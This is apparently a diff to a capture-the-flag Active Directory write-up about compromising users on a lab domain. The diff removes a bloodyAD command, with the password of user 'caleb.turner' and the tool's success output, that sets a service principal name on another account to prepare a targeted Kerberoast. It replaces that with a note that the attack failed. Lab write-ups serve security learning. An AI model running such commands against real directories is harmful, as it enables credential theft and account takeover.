@@ -546,19 +546,10 @@ cn: WRITE
 objectClass: WRITE
 ```
 
-I have write to the SPN, i can try a targeted kerberoast attack
+These are the attributes i can write to
 
 Also after getting a session as `caleb.turner` i can get the user flag
 
 # Compromising `oscar.mazerath`
 
-```python
-bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u caleb.turner -p '//newpassword123' -k set object 'CN=OSCAR.MAZERATH,OU=IT-TIER1,DC=HSM-DEFENSE,DC=LOCAL' servicePrincipalName -v 'service/hacked'
-[+] CN=OSCAR.MAZERATH,OU=IT-TIER1,DC=HSM-DEFENSE,DC=LOCAL's servicePrincipalName has been updated
-```
-
-First ill set the SPN
-
-```python
-
-```
+So ive tried to do a targeted kerberoast attack, but there is no support the the encryption type, and i dont have the rights to change the encrpytion type on the user
